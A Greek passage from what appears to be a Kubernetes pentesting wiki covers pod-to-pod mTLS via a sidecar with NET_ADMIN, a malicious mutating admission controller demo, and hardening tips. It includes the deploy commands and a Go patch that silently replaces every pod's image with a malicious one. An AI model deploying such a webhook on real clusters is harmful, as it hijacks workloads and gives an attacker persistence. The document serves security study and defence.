Από προεπιλογή δεν υπάρχει κρυπτογράφηση στην επικοινωνία μεταξύ των pods. Αμοιβαία πιστοποίηση, αμφίδρομη, pod προς pod.

#### Δημιουργία μιας εφαρμογής proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Δημιουργήστε το .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Επεξεργαστείτε το .yaml σας και προσθέστε τις μη σχολιασμένες γραμμές:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command:
[
"sh",
"-c",
"apt update && apt install iptables -y && iptables -L && sleep 1h",
]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Δείτε τα αρχεία καταγραφής του proxy:
```bash
kubectl logs app -C proxy
```
Περισσότερες πληροφορίες στο: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Κακόβουλος Ελεγκτής Εισόδου

Ένας ελεγκτής εισόδου **παρεμβαίνει σε αιτήματα προς τον διακομιστή API του Kubernetes** πριν από την αποθήκευση του αντικειμένου, αλλά **μετά την πιστοποίηση** **και την εξουσιοδότηση** του αιτήματος.

Εάν ένας επιτιθέμενος καταφέρει με κάποιο τρόπο να **εισάγει έναν Κακόβουλο Ελεγκτή Εισόδου**, θα είναι σε θέση να **τροποποιήσει ήδη πιστοποιημένα αιτήματα**. Έχοντας τη δυνατότητα να αποκτήσει προνόμια, και πιο συχνά να παραμείνει στο cluster.

**Παράδειγμα από** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Έλεγχος της κατάστασης για να δούμε αν είναι έτοιμο:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format&format=webp)

Στη συνέχεια, αναπτύξτε ένα νέο pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Όταν μπορείτε να δείτε το σφάλμα `ErrImagePull`, ελέγξτε το όνομα της εικόνας με μία από τις ερωτήσεις:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Όπως μπορείτε να δείτε στην παραπάνω εικόνα, προσπαθήσαμε να εκτελέσουμε την εικόνα `nginx`, αλλά η τελική εκτελούμενη εικόνα είναι `rewanthtammana/malicious-image`. Τι συνέβη μόλις τώρα!!;

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

Το σενάριο `./deploy.sh` εγκαθιστά έναν μεταβαλλόμενο ελεγκτή εισόδου webhook, ο οποίος τροποποιεί τα αιτήματα προς το Kubernetes API όπως καθορίζεται στις γραμμές διαμόρφωσής του, επηρεάζοντας τα αποτελέσματα που παρατηρούνται:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{{#ref}}
../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md
{{#endref}}

## Καλές Πρακτικές

### **Απενεργοποίηση Αυτόματης Τοποθέτησης Δεδομένων Λογαριασμού Υπηρεσίας**

- **Pods και Λογαριασμοί Υπηρεσίας**: Από προεπιλογή, τα pods τοποθετούν ένα διακριτικό λογαριασμού υπηρεσίας. Για να ενισχυθεί η ασφάλεια, το Kubernetes επιτρέπει την απενεργοποίηση αυτής της αυτόματης τοποθέτησης.
- **Πώς να Εφαρμόσετε**: Ορίστε `automountServiceAccountToken: false` στη διαμόρφωση των λογαριασμών υπηρεσίας ή των pods από την έκδοση 1.6 του Kubernetes.

### **Περιοριστική Ανάθεση Χρηστών σε RoleBindings/ClusterRoleBindings**

- **Επιλεκτική Συμπερίληψη**: Βεβαιωθείτε ότι μόνο οι απαραίτητοι χρήστες περιλαμβάνονται σε RoleBindings ή ClusterRoleBindings. Ελέγχετε τακτικά και αφαιρέστε άσχετους χρήστες για να διατηρήσετε σφιχτή ασφάλεια.

### **Ρόλοι Συγκεκριμένοι σε Namespace Αντί Ρόλων Cluster-Wide**

- **Ρόλοι vs. ClusterRoles**: Προτιμήστε τη χρήση Ρόλων και RoleBindings για άδειες συγκεκριμένες σε namespace αντί για ClusterRoles και ClusterRoleBindings, που ισχύουν σε επίπεδο cluster. Αυτή η προσέγγιση προσφέρει πιο λεπτό έλεγχο και περιορίζει την έκταση των αδειών.

### **Χρησιμοποιήστε αυτοματοποιημένα εργαλεία**

{{#ref}}
https://github.com/cyberark/KubiScan
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-hunter
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-bench
{{#endref}}

## **Αναφορές**

- [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
- [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{{#include ../../../banners/hacktricks-training.md}}
